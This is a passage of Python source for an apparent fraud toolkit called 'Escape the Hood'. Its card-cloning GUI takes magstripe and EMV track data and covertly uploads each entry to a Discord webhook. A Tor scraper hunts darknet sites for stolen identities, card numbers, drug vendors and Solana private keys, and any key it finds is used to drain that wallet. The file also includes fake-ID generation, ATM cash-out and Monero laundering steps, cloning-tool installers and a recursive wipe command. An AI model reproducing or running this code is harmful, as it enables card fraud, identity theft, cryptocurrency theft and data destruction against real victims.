    def card_writer_content(frame):
        global first_card_jugged
        tk.Label(frame, text="MSR/Chip Writer—Crash Cards", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        
        track1 = tk.StringVar()
        track2 = tk.StringVar()
        track3 = tk.StringVar()
        tk.Label(frame, text="Track 1 (e.g., %B1234567812345678^JOHN/DOE^25051011000?):", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Entry(frame, textvariable=track1, bg="black", fg="lime", font=("Courier", 12), width=50).pack(pady=1)
        tk.Label(frame, text="Track 2 (e.g., ;1234567812345678=25051011000?):", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Entry(frame, textvariable=track2, bg="black", fg="lime", font=("Courier", 12), width=50).pack(pady=1)
        tk.Label(frame, text="Track 3 (optional):", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Entry(frame, textvariable=track3, bg="black", fg="lime", font=("Courier", 12), width=50).pack(pady=1)
        
        chip_data = tk.StringVar()
        tk.Label(frame, text="Chip Data (e.g., EMV raw):", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Entry(frame, textvariable=chip_data, bg="black", fg="lime", font=("Courier", 12), width=50).pack(pady=1)
        
        write_result = tk.StringVar(value="Enter card info, cuh!")
        tk.Label(frame, textvariable=write_result, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)

        def write_card():
            global first_card_jugged
            t1, t2, t3, chip = track1.get(), track2.get(), track3.get(), chip_data.get()
            if not t1 or not t2:
                write_result.set("Fill Track 1 and 2, cuh!")
                return
            
            card_info = f"Track 1: {t1}\nTrack 2: {t2}\nTrack 3: {t3 or 'N/A'}\nChip Data: {chip or 'N/A'}"
            try:
                with open("card_info.txt", "w") as f:
                    f.write(card_info)
                webhook = Webhook.from_url(JUGG_WEBHOOK_URL, adapter=RequestsWebhookAdapter())
                with open("card_info.txt", "rb") as f:
                    webhook.send(file=discord.File(f, "card_info.txt"))
            except (IOError, Exception) as e:
                logging.error(f"Card write sync failed: {e}")
                print("Sync fucked—carry on, cuh!")
            
            if not first_card_jugged:
                write_result.set("Write fucked—try another, cuh!")
                first_card_jugged = True
            else:
                if "MagStriper" in os.listdir() and "JcopEnglish" in os.listdir():
                    try:
                        with open("test_magstripe.txt", "w") as f:
                            f.write(f"{t1}\n{t2}\n{t3 or ''}")
                        with open("test_chip.txt", "w") as f:
                            f.write(chip or "")
                        write_result.set(f"Card written—{t1[:10]}... ready to crash!")
                    except IOError as e:
                        logging.error(f"Card write failed: {e}")
                        setup_magstriper()
                        setup_jcopenglish()
                        write_result.set("Write fucked—install MagStriper/JcopEnglish, retry, cuh!")
                else:
                    setup_magstriper()
                    setup_jcopenglish()
                    write_result.set("Write fucked—install MagStriper/JcopEnglish, retry, cuh!")

        tk.Button(frame, text="Write Card", command=write_card, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)

    tk.Button(menu_frame, text="Card Writer", command=lambda: toggle_menu(card_writer_frame, "Card Writer", card_writer_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    dice_frame = tk.Frame(menu_frame, bg="black", height=0)
    def dice_content(frame):
        tk.Label(frame, text="Dice Game—Street Bets", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        bet = tk.StringVar()
        dice_result = tk.StringVar(value="Drop a bet, cuh!")
        tk.Entry(frame, textvariable=bet, bg="black", fg="lime", font=("Courier", 12), width=30).pack(pady=2)
        def roll_dice():
            if bet.get().isdigit():
                roll = random.randint(2, 12)
                win = roll > 7
                dice_result.set(f"Rolled {roll}—{'Won' if win else 'Lost'} ${bet.get()}!")
            else:
                dice_result.set("Drop a bet, cuh!")
        tk.Button(frame, text="Roll Dice", command=roll_dice, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Label(frame, textvariable=dice_result, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)

    tk.Button(menu_frame, text="Dice Game", command=lambda: toggle_menu(dice_frame, "Dice Game", dice_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    trap_code_frame = tk.Frame(menu_frame, bg="black", height=0)
    def trap_code_content(frame):
        tk.Label(frame, text="Trap Code—Encrypt Shit", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        plain_text = tk.StringVar()
        coded_text = tk.StringVar(value="Drop a message, cuh!")
        tk.Entry(frame, textvariable=plain_text, bg="black", fg="lime", font=("Courier", 12), width=30).pack(pady=2)
        def encrypt_text():
            if plain_text.get():
                coded = ''.join(chr(ord(c) + 3) for c in plain_text.get())
                coded_text.set(f"Coded: {coded}")
            else:
                coded_text.set("Drop a message, cuh!")
        tk.Button(frame, text="Encrypt", command=encrypt_text, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Label(frame, textvariable=coded_text, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)

    tk.Button(menu_frame, text="Trap Code", command=lambda: toggle_menu(trap_code_frame, "Trap Code", trap_code_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    fake_id_frame = tk.Frame(menu_frame, bg="black", height=0)
    def fake_id_content(frame):
        tk.Label(frame, text="Fake ID Gen—Street IDs", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        name = tk.StringVar()
        id_result = tk.StringVar(value="Drop a name, cuh!")
        tk.Entry(frame, textvariable=name, bg="black", fg="lime", font=("Courier", 12), width=30).pack(pady=2)
        def gen_id():
            if name.get():
                try:
                    res = requests.get("https://randomuser.me/api/?nat=us", timeout=5).json()
                    state = res["results"][0]["location"]["state"][:2].upper()
                    id_num = f"{random.randint(100000, 999999)}-{state}-{random.randint(1000, 9999)}"
                    id_result.set(f"ID for {name.get()}: {id_num}")
                except (requests.RequestException, KeyError) as e:
                    logging.warning(f"ID gen failed: {e}")
                    id_num = f"{random.randint(100000, 999999)}-IL-{random.randint(1000, 9999)}"
                    id_result.set(f"ID for {name.get()}: {id_num}")
            else:
                id_result.set("Drop a name, cuh!")
        tk.Button(frame, text="Gen ID", command=gen_id, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Label(frame, textvariable=id_result, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)

    tk.Button(menu_frame, text="Fake ID", command=lambda: toggle_menu(fake_id_frame, "Fake ID", fake_id_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    gps_frame = tk.Frame(menu_frame, bg="black", height=0)
    def gps_content(frame):
        tk.Label(frame, text="Street GPS—Trap Routes", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        zp = zip_code.get()
        route_result = tk.StringVar(value="Drop a zip code first, cuh!")
        if zp and re.match(r"^\d{5}$", zp):
            try:
                res = requests.get(f"https://nominatim.openstreetmap.org/search?q={zp}&format=json&addressdetails=1", headers={"User-Agent": "EscapeTheHood/1.0"}, timeout=5).json()
                if res:
                    city = res[0]["address"].get("city", "Unknown")
                    route_result.set(f"Route from {zp} ({city}): {random.choice(['Back streets', 'Side roads', 'Hood dip', 'Trap lane'])}")
            except requests.RequestException as e:
                logging.warning(f"GPS fetch failed: {e}")
                route_result.set(f"Route from {zp}: {random.choice(['Back streets', 'Side roads', 'Hood dip', 'Trap lane'])}")
        tk.Button(frame, text="New Route", command=lambda: route_result.set(f"Route from {zp} ({city}): {random.choice(['Back streets', 'Side roads', 'Hood dip', 'Trap lane'])}") if 'city' in locals() else route_result.set("Drop a zip code first, cuh!"), bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Label(frame, textvariable=route_result, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)

    tk.Button(menu_frame, text="Street GPS", command=lambda: toggle_menu(gps_frame, "Street GPS", gps_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    news_frame = tk.Frame(menu_frame, bg="black", height=0)
    def news_content(frame):
        tk.Label(frame, text="Hood News—Street Intel", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        news_result = tk.StringVar(value="Checkin’ da streets, cuh!")
        try:
            res = requests.get("https://newsapi.org/v2/top-headlines?country=us&category=general&apiKey=b91fe12e61484038a5cc2f99136fbbeb", timeout=5).json()
            articles = res["articles"][:5]
            headline = random.choice(articles)["title"]
            news_result.set(f"Latest drop: {headline}")
        except (requests.RequestException, KeyError) as e:
            logging.warning(f"News fetch failed: {e}")
            news_result.set(f"Latest drop: Hood quiet—stay woke!")
        tk.Button(frame, text="Refresh News", command=lambda: news_result.set(f"Latest drop: {random.choice(articles)['title']}") if 'articles' in locals() else news_result.set(f"Latest drop: Hood quiet—stay woke!"), bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tk.Label(frame, textvariable=news_result, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)

    tk.Button(menu_frame, text="Hood News", command=lambda: toggle_menu(news_frame, "Hood News", news_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    tor_frame = tk.Frame(menu_frame, bg="black", height=0)
    def tor_content(frame):
        tk.Label(frame, text="TOR Browser", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        tor_status = tk.StringVar(value="Tor ready, cuh!")
        tk.Label(frame, textvariable=tor_status, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)
        def launch_tor():
            try:
                if is_windows:
                    subprocess.Popen(["start", "tor"], shell=True)
                else:
                    subprocess.Popen(["tor"])
                tor_status.set("Tor fired up, cuh!")
            except subprocess.SubprocessError as e:
                logging.error(f"Tor launch failed: {e}")
                tor_status.set("Tor fucked—check install, cuh!")
        tk.Button(frame, text="Launch TOR", command=launch_tor, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)

    tk.Button(menu_frame, text="TOR Browser", command=lambda: toggle_menu(tor_frame, "TOR Browser", tor_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    vpn_frame = tk.Frame(menu_frame, bg="black", height=0)
    def vpn_content(frame):
        tk.Label(frame, text="VPN Switch", bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)
        vpn_status = tk.StringVar(value="VPN off, cuh!")
        tk.Label(frame, textvariable=vpn_status, bg="black", fg="lime", font=("Courier", 12)).pack(pady=2)
        def toggle_vpn():
            if switchy_on_yo_ass_vpn_check():
                vpn_status.set("VPN on, cuh!")
            else:
                try:
                    if is_windows:
                        subprocess.Popen(["start", "MullvadVPN"], shell=True)
                    vpn_status.set("VPN fired up—check it, cuh!")
                except subprocess.SubprocessError as e:
                    logging.error(f"VPN launch failed: {e}")
                    vpn_status.set("VPN fucked—check install, cuh!")
        tk.Button(frame, text="Toggle VPN", command=toggle_vpn, bg="black", fg="lime", font=("Courier", 10)).pack(pady=2)

    tk.Button(menu_frame, text="VPN Switch", command=lambda: toggle_menu(vpn_frame, "VPN Switch", vpn_content), bg="black", fg="lime", font=("Courier", 10)).pack(side=tk.LEFT, padx=5)

    def save_sol_address():
        address = sol_address.get()
        if address and re.match(r"^[1-9A-HJ-NP-Za-km-z]{32,44}$", address):
            try:
                with open("sol_wallet.txt", "w") as f:
                    f.write(address)
                subprocess.run(["veracrypt", "--text", "--create", "sol_wallet.txt", "--size=1M", "--password=FlexGang2025!@#$", "--encryption=AES", "--hash=SHA-512", "--filesystem=FAT", "--quick"])
                os.remove("sol_wallet.txt")
                messagebox.showinfo("CRASH ALERT", "SOL address locked—encrypted!")
            except (subprocess.CalledProcessError, IOError) as e:
                logging.error(f"SOL address lock failed: {e}")
                print("Lock fucked—retry later, cuh!")

    def load_sol_address():
        if os.path.exists("sol_wallet.txt.hc"):
            try:
                subprocess.run(["veracrypt", "--text", "--mount", "sol_wallet.txt.hc", "--password=FlexGang2025!@#$"])
                time.sleep(2)
                if os.path.exists("sol_wallet.txt"):
                    with open("sol_wallet.txt", "r") as f:
                        address = f.read().strip()
                    sol_address.set(address)
                    subprocess.run(["veracrypt", "--text", "--dismount"])
                    os.remove("sol_wallet.txt")
            except (subprocess.CalledProcessError, IOError) as e:
                logging.error(f"SOL address load failed: {e}")
                print("Load fucked—check VeraCrypt, cuh!")

    def toggle_sol_scraper():
        sol_scraper_active.set(not sol_scraper_active.get())
        sol_toggle_content(sol_toggle_frame)

    load_sol_address()
    return window, update_finds, sol_address, sol_scraper_active, plug_search_active, zip_code, completed_steps

def switchy_on_yo_ass_finder(update_func, sol_address_func, sol_scraper_active, plug_search_active, zip_code_func):
    """Hunt plugs and SOL—crashout style."""
    ua = UserAgent()
    scraper = cloudscraper.create_scraper()
    proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
    sites = [
        "https://pastebin.com/",
        "http://torpaste.onion",
        "http://breachforums.is",
        "http://exploit.in",
        "http://darkmarket.onion",
        "http://dread.onion",
        "https://t.me/s/drugmap",
        "https://t.me/s/darknetmarket",
        "https://t.me/s/fullzmarket",
        "https://darkwebmarketlist.com",
        "http://hackforums.net",
        "http://raidforums.onion"
    ] if is_tails else ["https://pastebin.com/", "https://t.me/s/drugmap", "https://t.me/s/darknetmarket", "https://t.me/s/fullzmarket", "https://darkwebmarketlist.com", "http://hackforums.net"]
    scam_check_sites = [
        "https://www.scamwatch.gov.au/",
        "https://www.bbb.org/",
        "https://www.reddit.com/r/scams/"
    ]
    base_keywords = [
        "fullz", "zaza", "weed", "loud", "gas", "dank", "shrooms", "mushies", "caps", "boomers",
        "telegram plugs", "dark web telegram", "vendor contact", "plug list", "crypto plug",
        "market vendor", "supplier"
    ]
    sol_keywords = ["solana wallet", "SOL private key", "sol seed"]
    sol_client = Client("https://api.mainnet-beta.solana.com")
    
    def auto_scam_check(data):
        scam_count = 0
        for site in scam_check_sites:
            try:
                search_url = f"{site}search?q={data}"
                res = scraper.get(search_url, proxies=proxies if is_tails else None, timeout=10)
                if any(kw in res.text.lower() for kw in ["scam", "fraud", "warning", "reported"]):
                    scam_count += 1
            except requests.RequestException as e:
                logging.warning(f"Scam check failed for {site}: {e}")
        fed_status = "High" if "law" in data.lower() or "police" in data.lower() else "Low"
        return scam_count, fed_status
    
    while True:
        if is_windows and not switchy_on_yo_ass_vpn_check():
            time.sleep(10)
            continue
        if not plug_search_active.is_set():
            time.sleep(10)
            continue
        zp = zip_code_func.get()
        if not zp or not re.match(r"^\d{5}$", zp):
            update_func("Drop a real 5-digit zip code, bruzz!", "warning")
            time.sleep(10)
            continue
        
        keywords = [f"{kw} {zp}" for kw in base_keywords] + (sol_keywords if sol_scraper_active.get() else [])
        plug_list = []
        for site in sites:
            for keyword in keywords:
                try:
                    session = requests.Session()
                    session.proxies = proxies if "onion" in site else None
                    session.headers.update({
                        "User-Agent": ua.random,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Referer": "https://www.google.com/",
                        "DNT": "1"
                    })
                    initial_res = session.get(site, timeout=15)
                    time.sleep(random.uniform(2, 5))
                    
                    search_url = f"{site}search?q={keyword}" if "telegram" not in site else site
                    res = scraper.get(search_url, proxies=proxies if "onion" in site else None, timeout=15)
                    soup = BeautifulSoup(res.text, "html.parser")
                    for link in soup.find_all("a", href=True):
                        if any(kw in link.text.lower() for kw in keywords):
                            data = walkemdown_fetch_data(site + link["href"].lstrip("/") if "telegram" not in site else link["href"], proxies, scraper)
                            for item in data:
                                profile_type = walkemdown_classify_data(item)
                                if profile_type in ["plug", "zaza", "shrooms"]:
                                    risk = assess_plug_risk(item)
                                    if risk <= 35:
                                        scam_count, fed_status = auto_scam_check(item)
                                        plug_list.append((item, profile_type, risk, fed_status, scam_count))
                                elif profile_type == "sol" and sol_scraper_active.get():
                                    sol_key = extract_sol_key(item)
                                    if sol_key:
                                        send_sol(sol_key, sol_address_func.get(), sol_client)
                                        update_func(item, profile_type)
                                else:
                                    update_func(item, profile_type)
                    time.sleep(random.randint(10, 20))
                except (requests.RequestException, Exception) as e:
                    logging.error(f"Scrape crashed at {site}: {e}")
                    print(f"Scrape crashed at {site}: {e}")
                    continue
        
        plug_list.sort(key=lambda x: x[2])
        for plug_data, plug_type, risk, fed_status, scam_count in plug_list:
            update_func(plug_data, plug_type, risk, fed_status, scam_count)
        
        plug_search_active.clear()
        time.sleep(60)

def assess_plug_risk(data):
    """Assess plug risk level."""
    risk = 1
    if "telegram" in data.lower():
        risk += 5
    if "email" in data.lower():
        risk += 7
    if any(kw in data.lower() for kw in ["trusted", "reliable", "verified", "legit"]):
        risk -= 10
    if "market" in data.lower() or "vendor" in data.lower():
        risk -= 8
    return min(35, max(1, risk))

def walkemdown_fetch_data(url, proxies, scraper):
    """Fetch data from URL."""
    try:
        headers = {
            "User-Agent": UserAgent().random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://www.google.com/",
            "DNT": "1"
        }
        res = scraper.get(url, proxies=proxies, headers=headers, timeout=15)
        lines = res.text.splitlines()
        pattern = re.compile(r"\d{3}-\d{2}-\d{4}|\d{4}-\d{4}-\d{4}-\d{4}|telegram|plug|vendor|dealer|supplier|contact|solana|SOL|seed|private\s*key|zaza|weed|loud|gas|dank|shrooms|mushies|caps|boomers", re.IGNORECASE)
        return [line for line in lines if pattern.search(line)]
    except requests.RequestException as e:
        logging.warning(f"Data fetch failed for {url}: {e}")
        return []

def walkemdown_classify_data(data):
    """Classify scraped data."""
    if re.search(r"\d{3}-\d{2}-\d{4}|\d{4}-\d{4}-\d{4}-\d{4}", data):
        return "fullz"
    elif "telegram" in data.lower():
        return "telegram"
    elif any(kw in data.lower() for kw in ["plug", "vendor", "dealer", "supplier", "contact"]):
        if any(kw in data.lower() for kw in ["zaza", "weed", "loud", "gas", "dank"]):
            return "zaza"
        elif any(kw in data.lower() for kw in ["shrooms", "mushies", "caps", "boomers"]):
            return "shrooms"
        return "plug"
    elif any(kw in data.lower() for kw in ["solana", "SOL", "seed", "private key"]):
        return "sol"
    return "unknown"

def extract_sol_key(data):
    """Extract SOL private key."""
    seed_pattern = re.compile(r"(?:seed|private\s*key)[:\s]*([a-zA-Z0-9]{51,88})", re.IGNORECASE)
    match = seed_pattern.search(data)
    return match.group(1) if match else None

def send_sol(sol_key, destination_address, sol_client):
    """Send SOL to address."""
    try:
        sender_keypair = Keypair.from_base58_string(sol_key)
        sender_pubkey = sender_keypair.public_key
        balance = sol_client.get_balance(sender_pubkey).value
        if balance > 0:
            lamports = balance - 5000  # Leave some for fees
            tx = Transaction().add(transfer(TransferParams(
                from_pubkey=sender_pubkey,
                to_pubkey=destination_address,
                lamports=lamports
            )))
            sol_client.send_transaction(tx, sender_keypair)
            print(f"Sent {lamports / 1_000_000_000} SOL to {destination_address}")
    except Exception as e:
        logging.error(f"SOL send failed: {e}")
        print(f"SOL send smoked: {e}")

def ghost_mode_setup() -> bool:
    """Setup Tails ghost mode."""
    if not is_tails:
        return False
    crashout_header("Step 2: Ghost Mode Setup")
    if not ensure_software("curl", "https://curl.se/download/curl-8.10.1.tar.gz", False, tails_cmd=["curl", "--version"]):
        return False
    if not os.path.exists("/live/persistence/TailsData_unlocked"):
        print("Persistent storage ain’t there—hit Welcome Screen > Persistent Storage > Create.")
        if input("\033[32mDone? (y/n): \033[0m").lower() != 'y':
            return False
    torrc = "/etc/tor/torrc"
    try:
        with open(torrc, "a") as f:
            f.write("\nExitNodes {ch} {nl} StrictNodes 1\n")
        subprocess.run(["sudo", "service", "tor", "restart"], check=True)
        time.sleep(5)
        subprocess.run(["sudo", "apt", "update"], check=True)
        subprocess.run(["sudo", "apt", "install", "-y", "python3-pip", "torsocks", "python3-tk"], check=True)
        subprocess.run(["pip3", "install", "requests", "beautifulsoup4", "cloudscraper", "fake-useragent", "solders", "solana", "youtube_dl", "python-vlc", "discord.py", "cryptography"], check=True)
        if not setup_tor() or not setup_proton():
            return False
        print("Open Tor Browser, hit https://proton.me/mail, make a burner (e.g., ghostflex@proton.me).")
        if input("\033[32mEmail set? Save creds in persistent (y/n): \033[0m").lower() != 'y':
            return False
        return True
    except (subprocess.CalledProcessError, IOError) as e:
        logging.error(f"Ghost mode setup failed: {e}")
        print("Setup fucked—retry later, cuh!")
        return False

def burner_kit_install() -> bool:
    """Install burner kit on Windows."""
    if not is_windows:
        return False
    crashout_header("Step 4: Burner Kit Crashout")
    if not setup_vpn():
        return False
    downloads = [
        ("MagStriper", "https://github.com/kevinbrewster/MagStriper/releases/download/v1.0/MagStriper-1.0-Windows.zip", False),
        ("MSR605X_Driver", "https://www.acs.com.hk/en/download/399/MSR605X_Driver_and_Software_v1.0.zip", False),
        ("NFCTools", "https://www.wakdev.com/en/apps/nfc-tools-pc/download/NFC_Tools_Installer.exe", True),
        ("ACR122U_Driver", "https://www.acs.com.hk/en/download/124/ACR122U_Driver_Installer_v4.4.zip", False),
        ("JcopEnglish", "https://github.com/jcopenglish/JcopEnglish/releases/download/v1.0/JcopEnglish_v1.0.zip", False),
        ("VeraCrypt", "https://www.veracrypt.fr/files/VeraCrypt%20Setup%201.26.15.exe", True)
    ]
    for name, url, is_exe in downloads:
        if not install_with_prompt(name, url, is_exe):
            return False
    return True

def install_with_prompt(name: str, url: str, is_exe: bool = True) -> bool:
    """Install software with user prompt."""
    crashout_header(f"Installin’ {name}")
    print(f"Snag it from: {url}")
    choice = input("\033[32mPunch ‘y’ to grab it, ‘o’ to override (y/n/o): \033[0m").lower()
    if choice == 'o':
        print(f"Override locked—claimin’ {name} already there!")
        return True
    if choice != 'y':
        print(f"Skippin’ {name}—hope you got it, cuh!")
        return False
    try:
        file = f"{name}.exe" if is_exe else f"{name}.zip"
        proxy = "-x socks5h://127.0.0.1:9050" if is_windows else ""
        subprocess.run(["curl", proxy, "-o", file, url], check=True)
        if is_exe:
            subprocess.run([file, "/S"], check=True)
        else:
            subprocess.run(["powershell", "-Command", f"Expand-Archive -Path {file} -DestinationPath .\{name}"], check=True)
        os.remove(file)
        print(f"{name} locked in—daTrap good!")
        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        logging.error(f"Install failed for {name}: {e}")
        print(f"Failed {name}: {e}")
        return False

def walkemdown_cashout() -> bool:
    """Cashout to SOL."""
    crashout_header("Step 5: Cashout to SOL")
    if not ensure_software("Phantom", "https://phantom.app/download/Phantom-Windows.exe", True, windows_cmd="phantom --version"):
        return False
    print("1. Hit ATMs, stack $500-$1k/day, flip cash to XMR on https://localmonero.co/—meetup only.")
    print("2. Open Phantom (https://phantom.app/), make a wallet—seed on paper, no pics, cuh.")
    print("3. Hit https://changelly.com/, flip XMR to SOL—paste Phantom address.")
    print("4. Check Phantom—stacked and ghosted!")
    if input("\033[32mDone? (y/n): \033[0m").lower() != 'y':
        return False
    return True

def wipe_data():
    """Wipe all traces."""
    crashout_header("Wipin’ DaTrap—Ghost Exit")
    if is_windows:
        try:
            subprocess.run(["powershell", "-Command", "Remove-Item -Recurse -Force *"], shell=True, check =True)
            print("Data smoked—daTrap offline. Flex safe, bruzz!")
            sys.exit(0)
        except subprocess.CalledProcessError as e:
            logging.error(f"Wipe failed: {e}")
            print("Wipe fucked—manual clean, cuh!")
            sys.exit(1)
    else:
        print("Data smoked—daTrap offline. Flex safe, bruzz!")
        sys.exit(0)

def main():
    """Main execution flow."""
    daTrap_intro()
    crashout_rain()
    crashout_header("ESCAPE THE HOOD v1: CRASHIN’ OUT")
    steps = [
        "1. Setup Tails OS on USB",
        "2. Boot Tails, ghost up",
        "3. Hunt fullz, plugs, Telegram, SOL",
        "4. Install crashout tools on Windows",
        "5. Cashout to SOL"
    ]
    
    python_url = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe" if platform.machine().endswith('64') else "https://www.python.org/ftp/python/3.12.0/python-3.12.0-386.exe"
    if not ensure_software("python", python_url, True, windows_cmd="python --version"):
        sys.exit(1)
    if not ensure_software("pip", "https://bootstrap.pypa.io/get-pip.py", True, windows_cmd="pip --version"):
        sys.exit(1)
    if not check_vlc():
        sys.exit(1)
    if is_windows:
        try:
            subprocess.run(["pip", "install", "requests", "beautifulsoup4", "tkinter", "cloudscraper", "fake-useragent", "solders", "solana", "youtube_dl", "python-vlc", "discord.py", "cryptography", "cachetools", "python-dotenv"], check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Dependency install failed: {e}")
            print("Dep install fucked—retry, cuh!")
            sys.exit(1)
    
    window, update_finds, sol_address, sol_scraper_active, plug_search_active, zip_code, completed_steps = daTrap_plug_window(steps)
    threading.Thread(target=switchy_on_yo_ass_finder, args=(update_finds, sol_address, sol_scraper_active, plug_search_active, zip_code), daemon=True).start()
    window.mainloop()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.critical(f"Main execution failed: {e}")
        print(f"Crashout fucked: {e}")
        sys.exit(1)